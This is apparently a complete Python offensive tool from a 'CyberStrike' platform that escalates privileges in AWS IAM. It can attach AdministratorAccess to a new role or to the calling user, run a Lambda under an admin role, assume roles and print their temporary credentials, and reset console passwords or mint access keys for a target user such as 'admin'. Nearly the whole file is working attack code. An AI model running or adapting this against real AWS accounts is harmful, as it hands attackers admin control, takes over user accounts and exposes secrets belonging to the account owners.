#!/usr/bin/env python3
"""
iam_privesc.py — AWS IAM Privilege Escalation Exploitation

Exploits IAM misconfigurations via PassRole+Lambda, AssumeRole, AttachPolicy,
CreateLoginProfile, and CreateAccessKey escalation paths.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
import zipfile
import io
from datetime import datetime
from pathlib import Path

try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
except ImportError:
    print("ERROR: boto3 required. Install: pip3 install boto3", file=sys.stderr)
    sys.exit(1)

STATE_FILE = str(Path.home() / ".cyberstrike" / "awshook-state.json")


def get_session(args):
    kwargs = {}
    if args.profile:
        kwargs["profile_name"] = args.profile
    if args.region:
        kwargs["region_name"] = args.region
    return boto3.Session(**kwargs)


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class IamPrivEsc:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS IAM Privilege Escalation")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Method:    {self.args.method}")
        print(f"Profile:   {self.args.profile or 'default'}")
        print(f"Region:    {self.args.region or 'default'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<16}] [{status.upper():<8}] {detail}", flush=True)

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def method_passrole(self, session):
        iam = session.client("iam")
        lam = session.client("lambda")
        sts = session.client("sts")

        account = sts.get_caller_identity()["Account"]
        role_name = f"cs-privesc-role-{int(time.time())}"
        func_name = f"cs-privesc-func-{int(time.time())}"

        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"Service": "lambda.amazonaws.com"},
                "Action": "sts:AssumeRole"
            }]
        }

        try:
            role = iam.create_role(
                RoleName=role_name,
                AssumeRolePolicyDocument=json.dumps(trust_policy),
                Description="CyberStrike privesc role",
            )
            role_arn = role["Role"]["Arn"]
            self.track_resource("iam_role", role_name, arn=role_arn)
            self.emit({"action": "create_role", "status": "success", "detail": f"Created role {role_name}", "arn": role_arn})

            iam.attach_role_policy(RoleName=role_name, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
            self.track_resource("role_policy_attachment", role_name, policy="AdministratorAccess")
            self.emit({"action": "attach_policy", "status": "success", "detail": f"Attached AdministratorAccess to {role_name}"})
        except ClientError as e:
            self.emit({"action": "create_role", "status": "failed", "detail": str(e)})
            return

        lambda_code = "import boto3\ndef handler(event, context):\n    sts = boto3.client('sts')\n    return sts.get_caller_identity()\n"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("lambda_function.py", lambda_code)
        buf.seek(0)

        self.emit({"action": "wait", "status": "info", "detail": "Waiting for role propagation (10s)..."})
        time.sleep(10)

        try:
            func = lam.create_function(
                FunctionName=func_name,
                Runtime="python3.12",
                Role=role_arn,
                Handler="lambda_function.handler",
                Code={"ZipFile": buf.read()},
                Timeout=30,
            )
            self.track_resource("lambda_function", func_name, arn=func["FunctionArn"])
            self.emit({"action": "create_lambda", "status": "success", "detail": f"Created function {func_name}", "arn": func["FunctionArn"]})
        except ClientError as e:
            self.emit({"action": "create_lambda", "status": "failed", "detail": str(e)})
            return

        try:
            response = lam.invoke(FunctionName=func_name)
            payload = json.loads(response["Payload"].read())
            self.emit({
                "action": "invoke",
                "status": "success",
                "detail": f"Lambda identity: {payload.get('Arn', 'unknown')}",
                "lambda_identity": payload,
            })
        except ClientError as e:
            self.emit({"action": "invoke", "status": "failed", "detail": str(e)})

    def method_assumerole(self, session):
        sts = session.client("sts")
        role_arn = self.args.role_arn
        if not role_arn:
            self.emit({"action": "assumerole", "status": "failed", "detail": "--role-arn is required for assumerole method"})
            return

        try:
            creds = sts.assume_role(RoleArn=role_arn, RoleSessionName=f"cs-privesc-{int(time.time())}", DurationSeconds=3600)
            assumed = creds["Credentials"]
            assumed_session = boto3.Session(
                aws_access_key_id=assumed["AccessKeyId"],
                aws_secret_access_key=assumed["SecretAccessKey"],
                aws_session_token=assumed["SessionToken"],
            )
            identity = assumed_session.client("sts").get_caller_identity()
            self.emit({
                "action": "assumerole",
                "status": "success",
                "detail": f"Assumed {role_arn} as {identity['Arn']}",
                "assumed_arn": identity["Arn"],
                "access_key_id": assumed["AccessKeyId"],
                "secret_access_key": assumed["SecretAccessKey"],
                "session_token": assumed["SessionToken"],
                "expiration": assumed["Expiration"],
            })
        except ClientError as e:
            self.emit({"action": "assumerole", "status": "failed", "detail": str(e)})

    def method_attach_policy(self, session):
        iam = session.client("iam")
        sts = session.client("sts")

        identity = sts.get_caller_identity()
        arn = identity["Arn"]

        if ":user/" in arn:
            username = arn.split(":user/")[-1]
            try:
                iam.attach_user_policy(UserName=username, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
                self.track_resource("user_policy_attachment", username, policy="AdministratorAccess")
                self.emit({"action": "attach_policy", "status": "success", "detail": f"Attached AdministratorAccess to user {username}"})
            except ClientError as e:
                self.emit({"action": "attach_policy", "status": "failed", "detail": str(e)})
        else:
            self.emit({"action": "attach_policy", "status": "failed", "detail": f"Current identity is not a user: {arn}"})

    def method_create_login(self, session):
        iam = session.client("iam")
        target = self.args.target_user
        if not target:
            self.emit({"action": "create_login", "status": "failed", "detail": "--target-user is required"})
            return

        import secrets
        password = secrets.token_urlsafe(20)
        try:
            iam.create_login_profile(UserName=target, Password=password, PasswordResetRequired=False)
            self.track_resource("login_profile", target)
            self.emit({
                "action": "create_login",
                "status": "success",
                "detail": f"Created console login for {target}",
                "username": target,
                "password": password,
            })
        except ClientError as e:
            if "EntityAlreadyExists" in str(e):
                try:
                    iam.update_login_profile(UserName=target, Password=password, PasswordResetRequired=False)
                    self.emit({
                        "action": "update_login",
                        "status": "success",
                        "detail": f"Updated console password for {target}",
                        "username": target,
                        "password": password,
                    })
                except ClientError as e2:
                    self.emit({"action": "update_login", "status": "failed", "detail": str(e2)})
            else:
                self.emit({"action": "create_login", "status": "failed", "detail": str(e)})

    def method_create_key(self, session):
        iam = session.client("iam")
        target = self.args.target_user
        if not target:
            self.emit({"action": "create_key", "status": "failed", "detail": "--target-user is required"})
            return

        try:
            key = iam.create_access_key(UserName=target)["AccessKey"]
            self.track_resource("access_key", key["AccessKeyId"], username=target)
            self.emit({
                "action": "create_key",
                "status": "success",
                "detail": f"Created access key for {target}",
                "username": target,
                "access_key_id": key["AccessKeyId"],
                "secret_access_key": key["SecretAccessKey"],
            })
        except ClientError as e:
            self.emit({"action": "create_key", "status": "failed", "detail": str(e)})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        session = get_session(self.args)

        methods = {
            "passrole": self.method_passrole,
            "assumerole": self.method_assumerole,
            "attach_policy": self.method_attach_policy,
            "create_login": self.method_create_login,
            "create_key": self.method_create_key,
        }

        method_fn = methods.get(self.args.method)
        if not method_fn:
            print(f"ERROR: Unknown method '{self.args.method}'. Available: {', '.join(methods.keys())}", file=sys.stderr)
            sys.exit(1)

        method_fn(session)
        self.cleanup()

    def cleanup(self):
        print(f"\n--- iam_privesc summary ---")
        print(f"Method: {self.args.method}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="AWS IAM privilege escalation via PassRole, AssumeRole, AttachPolicy, etc.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 iam_privesc.py --method passrole\n"
            "  python3 iam_privesc.py --method assumerole --role-arn arn:aws:iam::123456789:role/admin\n"
            "  python3 iam_privesc.py --method create_key --target-user admin\n"
        ),
    )
    parser.add_argument("--method", type=str, required=True, help="Escalation method: passrole|assumerole|attach_policy|create_login|create_key")
    parser.add_argument("--role-arn", type=str, default=None, help="Role ARN for assumerole method")
    parser.add_argument("--target-user", type=str, default=None, help="Target username for create_login/create_key")
    parser.add_argument("--profile", type=str, default=None, help="AWS profile name")
    parser.add_argument("--region", type=str, default=None, help="AWS region")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    privesc = IamPrivEsc(args)
    privesc.run()


if __name__ == "__main__":
    main()
